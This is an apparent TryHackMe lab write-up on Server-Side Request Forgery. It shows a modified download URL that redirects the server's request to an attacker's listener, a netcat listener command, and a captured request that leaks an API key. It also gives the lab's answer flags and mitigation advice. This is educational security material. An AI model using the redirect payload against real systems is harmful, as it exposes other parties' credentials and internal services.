
# Server-Side Request Forgery (SSRF) Lab

## Overview

Server-Side Request Forgery (SSRF) is a vulnerability that allows an attacker to make the server send unauthorized requests to internal or external systems.  
This happens when an application fetches remote resources based on user-supplied input without proper validation.

In this lab, we exploit an SSRF vulnerability to force the server to send a request to our AttackBox instead of the intended file storage server.

---

## Lab Environment

Platform: TryHackMe  
Application: SSRF Lab

Target Application URL Example:

```
http://MACHINE_IP:8087/
```

---

## Vulnerability Description

The application allows users to download files from a remote file storage server.

Example request:

```
http://10.10.255.106:8087/download?server=secure-file-storage.com&id=75482342
```

The **server parameter** determines which host the server will contact to retrieve the file.

Since the application does not properly validate this parameter, an attacker can change the value to their own server and intercept the request.

---

## Exploitation / Analysis Steps

## Performed in THM

![Server Side Request Forgery Lab](../images/10-server-side-request-forgery(SSRF).jpg)

### Step 1 — Explore the website

Open the target website:

```
http://MACHINE_IP:8087/
```

Navigate through the website and inspect the available sections.

You will notice an **Admin Area** that says:

```
Admin interface only available from localhost
```

This indicates that the admin panel can only be accessed internally.

Answer:

```
localhost
```

---

### Step 2 — Inspect the Download Resume feature

Click the **Download Resume** button and observe the request URL.

Example:

```
http://10.10.255.106:8087/download?server=secure-file-storage.com&id=75482342
```

The parameter:

```
server=secure-file-storage.com
```

indicates that the server fetches the file from that domain.

Answer:

```
secure-file-storage.com
```

---

### Step 3 — Start a listener on the AttackBox

On your AttackBox, start a netcat listener to capture incoming requests.

Example:

```
nc -lvnp 8000
```

---

### Step 4 — Exploit the SSRF vulnerability

Modify the **server parameter** so the application sends the request to your AttackBox instead of the secure file storage server.

Example payload:

```
http://10.10.255.106:8087/download?server=10.10.147.132:8000&id=75482342
```

---

### Step 5 — Capture the server request

When the request is sent, your listener will capture the request made by the vulnerable server.

Example captured request:

```
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.10.147.132:8000
User-Agent: Python-Requests
Accept: */*
API-KEY: THM{Hello_Im_just_an_API_key}
```

The intercepted request reveals an **API key**.

Answer:

```
THM{Hello_Im_just_an_API_key}
```

---

## Impact

Server-Side Request Forgery vulnerabilities can lead to:

- Access to internal services
- Exposure of sensitive API keys
- Access to localhost-only resources
- Cloud metadata exposure
- Internal network scanning

Attackers may use SSRF to pivot deeper into the internal network.

---

## Mitigation

To prevent SSRF vulnerabilities:

- Validate and sanitize all user-supplied URLs
- Implement allowlists for trusted domains
- Block requests to internal IP ranges (127.0.0.1, 169.254.169.254, etc.)
- Disable unnecessary URL fetching functionality
- Use network segmentation and firewall rules

---

## Disclaimer

This write-up is for educational purposes only and documents a lab exercise completed while learning web application security.
